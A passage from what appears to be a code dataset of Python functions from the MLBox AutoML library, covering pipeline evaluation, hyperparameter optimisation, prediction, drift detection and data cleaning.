    warnings.warn(""Optimiser will save all your fitted models into directory '"" + str(self.to_path) + ""/joblib'. Please clear it regularly."")"
AxeldeRomblay/MLBox,get_params,"def get_params(self, deep=True):
    return {'scoring': self.scoring, 'n_folds': self.n_folds, 'random_state': self.random_state, 'to_path': self.to_path, 'verbose': self.verbose}"
AxeldeRomblay/MLBox,set_params,"def set_params(self, **params):
    self.__fitOK = False
    for (k, v) in params.items():
        if k not in self.get_params():
            warnings.warn('Invalid parameter a for optimiser Optimiser. Parameter IGNORED. Check the list of available parameters with `optimiser.get_params().keys()`')
        else:
            setattr(self, k, v)"
AxeldeRomblay/MLBox,evaluate,"def evaluate(self, params, df):
    """"""Evaluates the data.


        Evaluates the data with a given scoring function and given hyper-parameters
        of the whole pipeline. If no parameters are set, default configuration for
        each step is evaluated : no feature selection is applied and no meta features are
        created.

        Parameters
        ----------
        params : dict, default = None.
            Hyper-parameters dictionary for the whole pipeline.

            - The keys must respect the following syntax : ""enc__param"".

                - ""enc"" = ""ne"" for na encoder
                - ""enc"" = ""ce"" for categorical encoder
                - ""enc"" = ""fs"" for feature selector [OPTIONAL]
                - ""enc"" = ""stck""+str(i) to add layer n°i of meta-features [OPTIONAL]
                - ""enc"" = ""est"" for the final estimator

                - ""param"" : a correct associated parameter for each step. Ex: ""max_depth"" for ""enc""=""est"", ...

            - The values are those of the parameters. Ex: 4 for key = ""est__max_depth"", ...

        df : dict, default = None
            Dataset dictionary. Must contain keys and values:

            - ""train"": pandas DataFrame for the train set.
            - ""target"" : encoded pandas Serie for the target on train set (with dtype='float' for a regression or dtype='int' for a classification). Indexes should match the train set.

        Returns
        -------
        float.
            The score. The higher the better.
            Positive for a score and negative for a loss.

        Examples
        --------
        >>> from mlbox.optimisation import *
        >>> from sklearn.datasets import load_boston
        >>> #load data
        >>> dataset = load_boston()
        >>> #evaluating the pipeline
        >>> opt = Optimiser()
        >>> params = {
        ...     ""ne__numerical_strategy"" : 0,
        ...     ""ce__strategy"" : ""label_encoding"",
        ...     ""fs__threshold"" : 0.1,
        ...     ""stck__base_estimators"" : [Regressor(strategy=""RandomForest""), Regressor(strategy=""ExtraTrees"")],
        ...     ""est__strategy"" : ""Linear""
        ... }
        >>> df = {""train"" : pd.DataFrame(dataset.data), ""target"" : pd.Series(dataset.target)}
        >>> opt.evaluate(params, df)
        """"""
    ne = NA_encoder()
    ce = Categorical_encoder()
    if df['target'].dtype == 'int':
        counts = df['target'].value_counts()
        classes_to_drop = counts[counts < self.n_folds].index
        mask_to_drop = df['target'].apply(lambda x: x in classes_to_drop)
        indexes_to_drop = df['target'][mask_to_drop].index
        n_classes = len(counts) - len(classes_to_drop)
        if n_classes == 1:
            raise ValueError(""Your target has not enough classes. You can't run the optimiser"")
        cv = StratifiedKFold(n_splits=self.n_folds, shuffle=True, random_state=self.random_state)
        est = Classifier()
        fs = None
        if params is not None:
            for p in params.keys():
                if p.startswith('fs__'):
                    fs = Clf_feature_selector()
                else:
                    pass
        STCK = {}
        if params is not None:
            for p in params.keys():
                if p.startswith('stck'):
                    STCK[p.split('__')[0]] = StackingClassifier(verbose=False)
                else:
                    pass
        if self.scoring is None:
            self.scoring = 'neg_log_loss'
        elif type(self.scoring) == str:
            if self.scoring not in list(SCORERS.keys()):
                warnings.warn('Unknown or invalid scoring metric. neg_log_loss is used instead.')
                self.scoring = 'neg_log_loss'
            elif n_classes <= 2:
                pass
            else:
                warnings.warn('This is a multiclass problem. Please make sure that your scoring metric is appropriate.')
                if self.scoring + '_weighted' in list(SCORERS.keys()):
                    warnings.warn('Weighted strategy for the scoring metric is used.')
                    self.scoring = self.scoring + '_weighted'
                elif self.scoring == 'roc_auc':
                    self.scoring = make_scorer(lambda y_true, y_pred: roc_auc_score(pd.get_dummies(y_true), y_pred), greater_is_better=True, needs_proba=True)
        else:
            pass
    elif df['target'].dtype == 'float':
        indexes_to_drop = []
        cv = KFold(n_splits=self.n_folds, shuffle=True, random_state=self.random_state)
        est = Regressor()
        fs = None
        if params is not None:
            for p in params.keys():
                if p.startswith('fs__'):
                    fs = Reg_feature_selector()
                else:
                    pass
        STCK = {}
        if params is not None:
            for p in params.keys():
                if p.startswith('stck'):
                    STCK[p.split('__')[0]] = StackingRegressor(verbose=False)
                else:
                    pass
        if self.scoring is None:
            self.scoring = 'neg_mean_squared_error'
        elif type(self.scoring) == str:
            if self.scoring not in list(SCORERS.keys()):
                warnings.warn('Unknown or invalid scoring metric. neg_mean_squared_error is used instead.')
                self.scoring = 'neg_mean_squared_error'
            else:
                pass
        else:
            pass
    else:
        raise ValueError('Impossible to determine the task. Please check that your target is encoded.')
    pipe = [('ne', ne), ('ce', ce)]
    cache = False
    if params is not None:
        if 'ce__strategy' in params:
            if params['ce__strategy'] == 'entity_embedding':
                cache = True
            else:
                pass
        else:
            pass
    if fs is not None:
        if 'fs__strategy' in params:
            if params['fs__strategy'] != 'variance':
                cache = True
            else:
                pass
    else:
        pass
    if len(STCK) != 0:
        cache = True
    else:
        pass
    if fs is not None:
        pipe.append(('fs', fs))
    else:
        pass
    for stck in np.sort(list(STCK)):
        pipe.append((stck, STCK[stck]))
    pipe.append(('est', est))
    if cache:
        pp = Pipeline(pipe, memory=self.to_path)
    else:
        pp = Pipeline(pipe)
    start_time = time.time()
    if params is None:
        set_params = True
        print('No parameters set. Default configuration is tested')
    else:
        try:
            pp = pp.set_params(**params)
            set_params = True
        except:
            set_params = False
    if set_params:
        if self.verbose:
            print('')
            print('##################################################### testing hyper-parameters... #####################################################')
            print('')
            print('>>> NA ENCODER :' + str(ne.get_params()))
            print('')
            print('>>> CA ENCODER :' + str({'strategy': ce.strategy}))
            if fs is not None:
                print('')
                print('>>> FEATURE SELECTOR :' + str(fs.get_params()))
            for (i, stck) in enumerate(np.sort(list(STCK))):
                stck_params = STCK[stck].get_params().copy()
                stck_params_display = {k: stck_params[k] for k in stck_params.keys() if k not in ['level_estimator', 'verbose', 'base_estimators']}
                print('')
                print('>>> STACKING LAYER n°' + str(i + 1) + ' :' + str(stck_params_display))
                for (j, model) in enumerate(stck_params['base_estimators']):
                    print('')
                    print('    > base_estimator n°' + str(j + 1) + ' :' + str(dict(list(model.get_params().items()) + list(model.get_estimator().get_params().items()))))
            print('')
            print('>>> ESTIMATOR :' + str(dict(list(est.get_params().items()) + list(est.get_estimator().get_params().items()))))
            print('')
        try:
            scores = cross_val_score(estimator=pp, X=df['train'].drop(indexes_to_drop), y=df['target'].drop(indexes_to_drop), scoring=self.scoring, cv=cv)
            score = np.mean(scores)
        except:
            scores = [-np.inf for _ in range(self.n_folds)]
            score = -np.inf
    else:
        raise ValueError('Pipeline cannot be set with these parameters. Check the name of your stages.')
    if score == -np.inf:
        warnings.warn('An error occurred while computing the cross validation mean score. Please check that the parameter values are correct and that your scoring function is valid and appropriate to the task.')
    out = ' ('
    for (i, s) in enumerate(scores[:-1]):
        out = out + 'fold ' + str(i + 1) + ' = ' + str(s) + ', '
    if self.verbose:
        print('')
        print('MEAN SCORE : ' + str(self.scoring) + ' = ' + str(score))
        print('VARIANCE : ' + str(np.std(scores)) + out + 'fold ' + str(i + 2) + ' = ' + str(scores[-1]) + ')')
        print('CPU time: %s seconds' % (time.time() - start_time))
        print('')
    return score"
AxeldeRomblay/MLBox,optimise,"def optimise(self, space, df, max_evals=40):
    """"""Optimises the Pipeline.

        Optimises hyper-parameters of the whole Pipeline with a given scoring
        function. Algorithm used to optimize : Tree Parzen Estimator.

        IMPORTANT : Try to avoid dependent parameters and to set one feature
        selection strategy and one estimator strategy at a time.

        Parameters
        ----------
        space : dict, default = None.
            Hyper-parameters space:

            - The keys must respect the following syntax : ""enc__param"".

                - ""enc"" = ""ne"" for na encoder
                - ""enc"" = ""ce"" for categorical encoder
                - ""enc"" = ""fs"" for feature selector [OPTIONAL]
                - ""enc"" = ""stck""+str(i) to add layer n°i of meta-features [OPTIONAL]
                - ""enc"" = ""est"" for the final estimator

                - ""param"" : a correct associated parameter for each step. Ex: ""max_depth"" for ""enc""=""est"", ...

            - The values must respect the syntax: {""search"":strategy,""space"":list}

                - ""strategy"" = ""choice"" or ""uniform"". Default = ""choice""
                - list : a list of values to be tested if strategy=""choice"". Else, list = [value_min, value_max].

        df : dict, default = None
            Dataset dictionary. Must contain keys and values:

            - ""train"": pandas DataFrame for the train set.
            - ""target"" : encoded pandas Serie for the target on train set (with dtype='float' for a regression or dtype='int' for a classification). Indexes should match the train set.

        max_evals : int, default = 40.
            Number of iterations.
            For an accurate optimal hyper-parameter, max_evals = 40.

        Returns
        -------
        dict.
            The optimal hyper-parameter dictionary.

        Examples
        --------
        >>> from mlbox.optimisation import *
        >>> from sklearn.datasets import load_boston
        >>> #loading data
        >>> dataset = load_boston()
        >>> #optimising the pipeline
        >>> opt = Optimiser()
        >>> space = {
        ...     'fs__strategy':{""search"":""choice"",""space"":[""variance"",""rf_feature_importance""]},
        ...     'est__colsample_bytree':{""search"":""uniform"", ""space"":[0.3,0.7]}
        ... }
        >>> df = {""train"" : pd.DataFrame(dataset.data), ""target"" : pd.Series(dataset.target)}
        >>> best = opt.optimise(space, df, 3)
        """"""
    hyperopt_objective = lambda params: -self.evaluate(params, df)
    if space is None:
        warnings.warn(""Space is empty. Please define a search space. Otherwise, call the method 'evaluate' for custom settings"")
        return dict()
    elif len(space) == 0:
        warnings.warn(""Space is empty. Please define a search space. Otherwise, call the method 'evaluate' for custom settings"")
        return dict()
    else:
        hyper_space = {}
        for p in space.keys():
            if 'space' not in space[p]:
                raise ValueError('You must give a space list ie values for hyper parameter ' + p + '.')
            elif 'search' in space[p]:
                if space[p]['search'] == 'uniform':
                    hyper_space[p] = hp.uniform(p, np.sort(space[p]['space'])[0], np.sort(space[p]['space'])[-1])
                elif space[p]['search'] == 'choice':
                    hyper_space[p] = hp.choice(p, space[p]['space'])
                else:
                    raise ValueError('Invalid search strategy for hyper parameter ' + p + "". Please choose between 'choice' and 'uniform'."")
            else:
                hyper_space[p] = hp.choice(p, space[p]['space'])
        best_params = fmin(hyperopt_objective, space=hyper_space, algo=tpe.suggest, max_evals=max_evals)
        for (p, v) in best_params.items():
            if 'search' in space[p]:
                if space[p]['search'] == 'choice':
                    best_params[p] = space[p]['space'][v]
                else:
                    pass
            else:
                best_params[p] = space[p]['space'][v]
        if self.verbose:
            print('')
            print('')
            print('~' * 137)
            print('~' * 57 + ' BEST HYPER-PARAMETERS ' + '~' * 57)
            print('~' * 137)
            print('')
            print(best_params)
        return best_params"
AxeldeRomblay/MLBox,__init__,"def __init__(self, to_path='save', verbose=True):
    self.to_path = to_path
    self.verbose = verbose"
AxeldeRomblay/MLBox,get_params,"def get_params(self, deep=True):
    return {'to_path': self.to_path, 'verbose': self.verbose}"
AxeldeRomblay/MLBox,set_params,"def set_params(self, **params):
    self.__fitOK = False
    for (k, v) in params.items():
        if k not in self.get_params():
            warnings.warn('Invalid parameter a for predictor Predictor. Parameter IGNORED. Check the list of available parameters with `predictor.get_params().keys()`')
        else:
            setattr(self, k, v)"
AxeldeRomblay/MLBox,__save_feature_importances,"def __save_feature_importances(self, importance, fig_name='feature_importance.png'):
    """"""Saves feature importances plot

        Parameters
        ----------
        importance : dict
            Dictionary with features (key) and importances (values)

        fig_name : str, default = ""feature_importance.png""
            figure name

        Returns
        -------
        NoneType
            None
        """"""
    if len(importance) > 0:
        importance_sum = np.sum(list(importance.values()))
        tuples = [(k, np.round(importance[k] * 100.0 / importance_sum, 2)) for k in importance]
        tuples = sorted(tuples, key=lambda x: x[1])
        (labels, values) = zip(*tuples)
        plt.figure(figsize=(20, int(len(importance) * 0.3) + 1))
        ylocs = np.arange(len(values))
        plt.barh(ylocs, values, align='center')
        for (x, y) in zip(values, ylocs):
            plt.text(x + 1, y, x, va='center')
        plt.yticks(ylocs, labels)
        plt.title('Feature importance (%)')
        plt.grid(True)
        plt.savefig(fig_name)
        plt.close()
        leak = sorted(dict(tuples).items(), key=operator.itemgetter(1))[-1]
        if (leak[-1] > 70) & (len(importance) > 1):
            warnings.warn('WARNING : ' + str(leak[0]) + ' is probably a leak ! Please check and delete it...')
    else:
        pass"
AxeldeRomblay/MLBox,__plot_feature_importances,"def __plot_feature_importances(self, importance, top=10):
    """"""Plots top 10 feature importances

        Parameters
        ----------
        importance : dict
            Dictionary with features (key) and importances (values)

        top : int
            Number of top features to display.

        Returns
        -------
        NoneType
            None
        """"""
    if len(importance) > 0:
        importance_sum = np.sum(list(importance.values()))
        tuples = [(k, np.round(importance[k] * 100.0 / importance_sum, 2)) for k in importance]
        tuples = sorted(tuples, key=lambda x: x[1])[-top:]
        (labels, values) = zip(*tuples)
        plt.figure(figsize=(20, top * 0.3 + 1))
        ylocs = np.arange(len(values))
        plt.barh(ylocs, values, align='center')
        for (x, y) in zip(values, ylocs):
            plt.text(x + 1, y, x, va='center')
        plt.yticks(ylocs, labels)
        plt.title('Top ' + str(top) + ' feature importance (%)')
        plt.grid(True)
        plt.show()
        plt.close()
    else:
        pass"
AxeldeRomblay/MLBox,fit_predict,"def fit_predict(self, params, df):
    """"""Fits the model and predicts on the test set.

        Also outputs feature importances and the submission file
        (.png and .csv format).

        Parameters
        ----------
        params : dict, default = None.
            Hyper-parameters dictionary for the whole pipeline.

            - The keys must respect the following syntax : ""enc__param"".

                - ""enc"" = ""ne"" for na encoder
                - ""enc"" = ""ce"" for categorical encoder
                - ""enc"" = ""fs"" for feature selector [OPTIONAL]
                - ""enc"" = ""stck""+str(i) to add layer n°i of meta-features [OPTIONAL]
                - ""enc"" = ""est"" for the final estimator

                - ""param"" : a correct associated parameter for each step. Ex: ""max_depth"" for ""enc""=""est"", ...

            - The values are those of the parameters. Ex: 4 for key = ""est__max_depth"", ...

        df : dict, default = None
            Dataset dictionary. Must contain keys and values:

            - ""train"": pandas DataFrame for the train set.
            - ""test"" : pandas DataFrame for the test set.
            - ""target"" : encoded pandas Serie for the target on train set (with dtype='float' for a regression or dtype='int' for a classification). Indexes should match the train set.

        Returns
        -------
        object
            self.
        """"""
    if self.to_path is None:
        raise ValueError('You must specify a path to save your model and your predictions')
    else:
        ne = NA_encoder()
        ce = Categorical_encoder()
        if df['target'].dtype == 'int':
            est = Classifier()
            fs = None
            if params is not None:
                for p in params.keys():
                    if p.startswith('fs__'):
                        fs = Clf_feature_selector()
                    else:
                        pass
            STCK = {}
            if params is not None:
                for p in params.keys():
                    if p.startswith('stck'):
                        STCK[p.split('__')[0]] = StackingClassifier()
                    else:
                        pass
        elif df['target'].dtype == 'float':
            est = Regressor()
            fs = None
            if params is not None:
                for p in params.keys():
                    if p.startswith('fs__'):
                        fs = Reg_feature_selector()
                    else:
                        pass
            STCK = {}
            if params is not None:
                for p in params.keys():
                    if p.startswith('stck'):
                        STCK[p.split('__')[0]] = StackingRegressor()
                    else:
                        pass
        else:
            raise ValueError('Impossible to determine the task. Please check that your target is encoded.')
        pipe = [('ne', ne), ('ce', ce)]
        cache = False
        if params is not None:
            if 'ce__strategy' in params:
                if params['ce__strategy'] == 'entity_embedding':
                    cache = True
                else:
                    pass
            else:
                pass
        if fs is not None:
            if 'fs__strategy' in params:
                if params['fs__strategy'] != 'variance':
                    cache = True
                else:
                    pass
        else:
            pass
        if len(STCK) != 0:
            cache = True
        else:
            pass
        if fs is not None:
            pipe.append(('fs', fs))
        else:
            pass
        for stck in np.sort(list(STCK)):
            pipe.append((stck, STCK[stck]))
        pipe.append(('est', est))
        if cache:
            pp = Pipeline(pipe, memory=self.to_path)
        else:
            pp = Pipeline(pipe)
        start_time = time.time()
        if params is None:
            print('')
            print('> No parameters set. Default configuration is tested')
            set_params = True
        else:
            try:
                pp = pp.set_params(**params)
                set_params = True
            except:
                set_params = False
        if set_params:
            try:
                if self.verbose:
                    print('')
                    print('fitting the pipeline ...')
                pp.fit(df['train'], df['target'])
                if self.verbose:
                    print('CPU time: %s seconds' % (time.time() - start_time))
                try:
                    os.mkdir(self.to_path)
                except OSError:
                    pass
                try:
                    importance = est.feature_importances()
                    self.__save_feature_importances(importance, self.to_path + '/' + est.get_params()['strategy'] + '_feature_importance.png')
                    if self.verbose:
                        self.__plot_feature_importances(importance, 10)
                        print('')
                        print('> Feature importances dumped into directory : ' + self.to_path)
                except:
                    warnings.warn('Unable to get feature importances !')
            except:
                raise ValueError('Pipeline cannot be fitted')
        else:
            raise ValueError('Pipeline cannot be set with these parameters. Check the name of your stages.')
        if df['test'].shape[0] == 0:
            warnings.warn('You have no test dataset. Cannot predict !')
        else:
            start_time = time.time()
            if df['target'].dtype == 'int':
                enc_name = 'target_encoder.obj'
                try:
                    fhand = open(self.to_path + '/' + enc_name, 'rb')
                    enc = pickle.load(fhand)
                    fhand.close()
                except:
                    raise ValueError(""Unable to load '"" + enc_name + ""' from directory : "" + self.to_path)
                try:
                    if self.verbose:
                        print('')
                        print('predicting ...')
                    pred = pd.DataFrame(pp.predict_proba(df['test']), columns=enc.inverse_transform(range(len(enc.classes_))), index=df['test'].index)
                    pred[df['target'].name + '_predicted'] = pred.idxmax(axis=1)
                    try:
                        pred[df['target'].name + '_predicted'] = pred[df['target'].name + '_predicted'].apply(int)
                    except:
                        pass
                except:
                    raise ValueError('Can not predict')
            elif df['target'].dtype == 'float':
                pred = pd.DataFrame([], columns=[df['target'].name + '_predicted'], index=df['test'].index)
                try:
                    if self.verbose:
                        print('')
                        print('predicting...')
                    pred[df['target'].name + '_predicted'] = pp.predict(df['test'])
                except:
                    raise ValueError('Can not predict')
            else:
                pass
            if self.verbose:
                print('CPU time: %s seconds' % (time.time() - start_time))
            if self.verbose:
                print('')
                print('> Overview on predictions : ')
                print('')
                print(pred.head(10))
            if self.verbose:
                print('')
                print('dumping predictions into directory : ' + self.to_path + ' ...')
            pred.to_csv(self.to_path + '/' + df['target'].name + '_predictions.csv', index=True)
    return self"
AxeldeRomblay/MLBox,__init__,"def __init__(self, threshold=0.6, inplace=False, verbose=True, to_path='save'):
    self.threshold = threshold
    self.inplace = inplace
    self.verbose = verbose
    self.to_path = to_path
    self.__Ddrifts = {}
    self.__fitOK = False"
AxeldeRomblay/MLBox,fit_transform,"def fit_transform(self, df):
    """"""Fits and transforms train and test datasets

        Automatically drops ids and drifting variables between train and test datasets.
        The list of drift coefficients is available and saved as ""drifts.txt""

        Parameters
        ----------
        df : dict, defaut = None
            Dictionnary containing :

            - 'train' : pandas dataframe for train dataset
            - 'test' : pandas dataframe for test dataset
            - 'target' : pandas serie for the target on train set

        Returns
        -------
        dict
            Dictionnary containing :

            - 'train' : transformed pandas dataframe for train dataset
            - 'test' : transformed pandas dataframe for test dataset
            - 'target' : pandas serie for the target on train set
        """"""
    if df['test'].shape[0] == 0:
        if self.verbose:
            print('')
            print('You have no test dataset...')
        return df
    else:
        start_time = time.time()
        ds = DriftThreshold(self.threshold)
        na = NA_encoder(numerical_strategy=0)
        ca = Categorical_encoder()
        pp = Pipeline([('na', na), ('ca', ca)])
        pp.fit(df['train'], None)
        if self.verbose:
            print('')
            print('computing drifts ...')
        ds.fit(pp.transform(df['train']), pp.transform(df['test']))
        if self.verbose:
            print('CPU time: %s seconds' % (time.time() - start_time))
            print('')
        self.__fitOK = True
        self.__Ddrifts = ds.drifts()
        drifts_top = sorted(ds.drifts().items(), key=lambda x: x[1], reverse=True)[:10]
        if self.verbose:
            print('> Top 10 drifts')
            print('')
            for d in range(len(drifts_top)):
                print(drifts_top[d])
        if self.verbose:
            print('')
            print('> Deleted variables : ' + str(ds.get_support(complement=True)))
        if self.to_path is not None:
            try:
                os.mkdir(self.to_path)
            except OSError:
                pass
            file = open(self.to_path + '/drifts.txt', 'w')
            file.write('\n')
            file.write('*******************************************  Drifts coefficients *******************************************\n')
            file.write('\n')
            for (var, d) in sorted(ds.drifts().items(), key=lambda x: x[1], reverse=True):
                file.write(str(var) + ' = ' + str(d) + '\n')
            file.close()
            if self.verbose:
                print('> Drift coefficients dumped into directory : ' + self.to_path)
        if self.inplace:
            df['train'] = ds.transform(df['train'])
            df['test'] = ds.transform(df['test'])
        else:
            return {'train': ds.transform(df['train']), 'test': ds.transform(df['test']), 'target': df['target']}"
AxeldeRomblay/MLBox,drifts,"def drifts(self):
    """"""Returns the univariate drifts for all variables.

        Returns
        -------
        dict
            Dictionnary containing the drifts for each feature
        """"""
    if self.__fitOK:
        return self.__Ddrifts
    else:
        raise ValueError('Call the fit_transform function before !')"
AxeldeRomblay/MLBox,convert_list,"def convert_list(serie):
    """"""Converts lists in a pandas serie into a dataframe
    where which element of a list is a column

    Parameters
    ----------
    serie : pandas Serie
        The serie you want to cast into a dataframe

    Returns
    -------
    pandas DataFrame
        The converted dataframe
    """"""
    import numpy
    import pandas
    if serie.apply(lambda x: type(x) == list).sum() > 0:
        serie = serie.apply(lambda x: [x] if type(x) != list else x)
        cut = int(numpy.percentile(serie.apply(len), 90))
        serie = serie.apply(lambda x: x[:cut])
        return pandas.DataFrame(serie.tolist(), index=serie.index, columns=[serie.name + '_item' + str(i + 1) for i in range(cut)])
    else:
        return serie"
AxeldeRomblay/MLBox,convert_float_and_dates,"def convert_float_and_dates(serie):
    """"""Converts into float if possible and converts dates.

    Creates timestamp from 01/01/2017, year, month, day, day_of_week and hour

    Parameters
    ----------
    serie : pandas Serie
        The serie you want to convert

    Returns
    -------
    pandas DataFrame
        The converted dataframe
    """"""
    import pandas
    if serie.dtype == 'datetime64[ns]':
        df = pandas.DataFrame([], index=serie.index)
        df[serie.name + '_TIMESTAMP'] = (pandas.DatetimeIndex(serie) - pandas.datetime(2017, 1, 1)).total_seconds()
        df[serie.name + '_YEAR'] = pandas.DatetimeIndex(serie).year.astype(float)
        df[serie.name + '_MONTH'] = pandas.DatetimeIndex(serie).month.astype(float)
        df[serie.name + '_DAY'] = pandas.DatetimeIndex(serie).day.astype(float)
        df[serie.name + '_DAYOFWEEK'] = pandas.DatetimeIndex(serie).dayofweek.astype(float)
        df[serie.name + '_HOUR'] = pandas.DatetimeIndex(serie).hour.astype(float) + pandas.DatetimeIndex(serie).minute.astype(float) / 60.0 + pandas.DatetimeIndex(serie).second.astype(float) / 3600.0
        return df
    else:
        try:
            serie = serie.apply(float)
        except:
            pass
        if serie.dtype != 'object':
            return serie
        else:
            df = pandas.DataFrame([], index=serie.index)
            try:
                serie_to_df = pandas.DatetimeIndex(pd.to_datetime(serie))
                df[serie.name + '_TIMESTAMP'] = (serie_to_df - pandas.datetime(2017, 1, 1)).total_seconds()
                df[serie.name + '_YEAR'] = serie_to_df.year.astype(float)
                df[serie.name + '_MONTH'] = serie_to_df.month.astype(float)
                df[serie.name + '_DAY'] = serie_to_df.day.astype(float)
                df[serie.name + '_DAYOFWEEK'] = serie_to_df.dayofweek.astype(float)
                df[serie.name + '_HOUR'] = serie_to_df.hour.astype(float) + serie_to_df.minute.astype(float) / 60.0 + serie_to_df.second.astype(float) / 3600.0
                return df
            except:
                return serie"
AxeldeRomblay/MLBox,__init__,"def __init__(self, sep=None, header=0, to_hdf5=False, to_path='save', verbose=True):
    self.sep = sep
    self.header = header
    self.to_hdf5 = to_hdf5
    self.to_path = to_path
    self.verbose = verbose"
AxeldeRomblay/MLBox,clean,"def clean(self, path, drop_duplicate=False):
    """"""Reads and cleans data (accepted formats : csv, xls, json and h5):

        - del Unnamed columns
        - casts lists into variables
        - try to cast variables into float
        - cleans dates and extracts timestamp from 01/01/2017, year, month, day, day_of_week and hour
        - drop duplicates (if drop_duplicate=True)

        Parameters
        ----------
        path : str
            The path to the dataset.

        drop_duplicate: bool, default = False
            If True, drop duplicates when reading each file.

        Returns
        -------
        pandas dataframe
            Cleaned dataset.
        """"""
    start_time = time.time()
    if path is None:
        raise ValueError('You must specify the path to load the data')
    else:
        type_doc = path.split('.')[-1]
        if type_doc == 'csv':
            if self.sep is None:
                raise ValueError('You must specify the separator for a csv file')
            else:
                if self.verbose:
                    print('')
                    print('reading csv : ' + path.split('/')[-1] + ' ...')
                df = pd.read_csv(path, sep=self.sep, header=self.header, engine='c', error_bad_lines=False)
        elif type_doc == 'xls':
            if self.verbose:
                print('')
                print('reading xls : ' + path.split('/')[-1] + ' ...')
            df = pd.read_excel(path, header=self.header)
        elif type_doc == 'h5':
            if sys.platform == 'win32' and sys.version_info[0] <= 3 and (sys.version_info[1] <= 5):
                raise ValueError('h5 format not supported for python under 3.6 on windows. Please upgrade python')
            if self.verbose:
                print('')
                print('reading hdf5 : ' + path.split('/')[-1] + ' ...')
            df = pd.read_hdf(path)
        elif type_doc == 'json':
            if sys.platform == 'win32' and sys.version_info[0] <= 3 and (sys.version_info[1] <= 5):
                raise ValueError('json format not supported for python under 3.6 on windows. Please upgrade python')
            if self.verbose:
                print('')
                print('reading json : ' + path.split('/')[-1] + ' ...')
            df = pd.read_json(path)
        else:
            raise ValueError('The document extension cannot be handled')
    try:
        del df['Unnamed: 0']
    except:
        pass
    if self.verbose:
        print('cleaning data ...')
    if sys.platform == 'win32':
        df = pd.concat([convert_list(df[col]) for col in df.columns], axis=1)
        df = pd.concat([convert_float_and_dates(df[col]) for col in df.columns], axis=1)
    else:
        df = pd.concat(Parallel(n_jobs=-1)((delayed(convert_list)(df[col]) for col in df.columns)), axis=1)
        df = pd.concat(Parallel(n_jobs=-1)((delayed(convert_float_and_dates)(df[col]) for col in df.columns)), axis=1)
    if drop_duplicate:
        if self.verbose:
            print('dropping duplicates')
        df = df.drop_duplicates()
    else:
        pass
    if self.verbose:
        print('CPU time: %s seconds' % (time.time() - start_time))
    return df"
AxeldeRomblay/MLBox,train_test_split,"def train_test_split(self, Lpath, target_name):
    """"""Creates train and test datasets

        Given a list of several paths and a target name, automatically creates and cleans train and test datasets.
        IMPORTANT: a dataset is considered as a test set if it does not contain the target value. Otherwise it is
        considered as part of a train set.
        Also determines the task and encodes the target (classification problem only).

        Finally dumps the datasets to hdf5, and eventually the target encoder.

        Parameters
        ----------
        Lpath : list, defaut = None
            List of str paths to load the data

        target_name : str, default = None
            The name of the target. Works for both classification
            (multiclass or not) and regression.

        Returns
        -------
        dict
            Dictionnary containing :

            - 'train' : pandas dataframe for train dataset
            - 'test' : pandas dataframe for test dataset
            - 'target' : encoded pandas Serie for the target on train set (with dtype='float' for a regression or dtype='int' for a classification)

        """"""
    col = []
    col_train = []
    col_test = []
    df_train = dict()
    df_test = dict()
    y_train = dict()
    if type(Lpath) != list:
        raise ValueError('You must specify a list of paths to load all the data')
    elif self.to_path is None:
        raise ValueError('You must specify a path to save your data and make sure your files are not already saved')
    else:
        for path in Lpath:
            df = self.clean(path, drop_duplicate=False)
            if target_name in df.columns:
                is_null = df[target_name].isnull()
                df_train[path] = df[~is_null].drop(target_name, axis=1)
                df_test[path] = df[is_null].drop(target_name, axis=1)
                y_train[path] = df[target_name][~is_null]
            else:
                df_test[path] = df
        del df
        if sum([df_train[path].shape[0] for path in df_train.keys()]) == 0:
            raise ValueError('You have no train dataset. Please check that the target name is correct.')
        if (sum([df_test[path].shape[0] for path in df_test.keys()]) == 0) & self.verbose:
            print('')
            print('You have no test dataset !')
        for (i, df) in enumerate(df_train.values()):
            if i == 0:
                col_train = df.columns
            else:
                col_train = list(set(col_train) & set(df.columns))
        for (i, df) in enumerate(df_test.values()):
            if i == 0:
                col_test = df.columns
            else:
                col_test = list(set(col_test) & set(df.columns))
        col = sorted(list(set(col_train) & set(col_test)))
        if self.verbose:
            print('')
            print('> Number of common features : ' + str(len(col)))
            print('')
            print('gathering and crunching for train and test datasets ...')
        df_train = pd.concat([df[col] for df in df_train.values()])
        df_test = pd.concat([df[col] for df in df_test.values()])
        y_train = pd.concat([y for y in y_train.values()])
        if type(y_train) == pd.core.frame.DataFrame:
            raise ValueError('Your target contains more than two columns ! Please check that only one column is named ' + target_name)
        else:
            pass
        if self.verbose:
            print('reindexing for train and test datasets ...')
        if df_train.index.nunique() < df_train.shape[0]:
            df_train.index = range(df_train.shape[0])
        if df_test.index.nunique() < df_test.shape[0]:
            df_test.index = range(df_test.shape[0])
        if y_train.index.nunique() < y_train.shape[0]:
            y_train.index = range(y_train.shape[0])
        if self.verbose:
            print('dropping training duplicates ...')
        df_train[target_name] = y_train.values
        df_train = df_train.drop_duplicates()
        del df_train[target_name]
        y_train = y_train.loc[df_train.index]
        if self.verbose:
            print('dropping constant variables on training set ...')
        for var in col:
            if df_train[var].nunique(dropna=False) == 1:
                del df_train[var]
                del df_test[var]
        sparse_features = (df_train.isnull().sum() * 100.0 / df_train.shape[0]).sort_values(ascending=False)
        sparse = True
        if sparse_features.max() == 0.0:
            sparse = False
        if self.verbose:
            print('')
            print('> Number of categorical features: ' + str(len(df_train.dtypes[df_train.dtypes == 'object'].index)))
            print('> Number of numerical features: ' + str(len(df_train.dtypes[df_train.dtypes != 'object'].index)))
            print('> Number of training samples : ' + str(df_train.shape[0]))
            print('> Number of test samples : ' + str(df_test.shape[0]))
            if sparse:
                print('')
                print('> Top sparse features (% missing values on train set):')
                print(np.round(sparse_features[sparse_features > 0.0][:5], 1))
            else:
                print('')
                print('> You have no missing values on train set...')
        task = 'regression'
        count = y_train.nunique()
        if count <= 2:
            task = 'classification'
        elif y_train.dtype == object:
            task = 'classification'
        else:
            pass
        if self.verbose:
            print('')
            print('> Task : ' + task)
        if task == 'classification':
            if self.verbose:
                print(y_train.value_counts())
                print('')
                print('encoding target ...')
            enc = LabelEncoder()
            y_train = pd.Series(enc.fit_transform(y_train.values), index=y_train.index, name=target_name, dtype='int')
            if count == 1:
                warnings.warn('Your target set has only one class ! Please check it is correct, otherwise there is no need to use MLBox...')
        elif self.verbose:
            print(y_train.describe())
        try:
            os.mkdir(self.to_path)
        except OSError:
            pass
        if self.to_hdf5:
            start_time = time.time()
            if self.verbose:
                print('')
                print('dumping files into directory : ' + self.to_path)
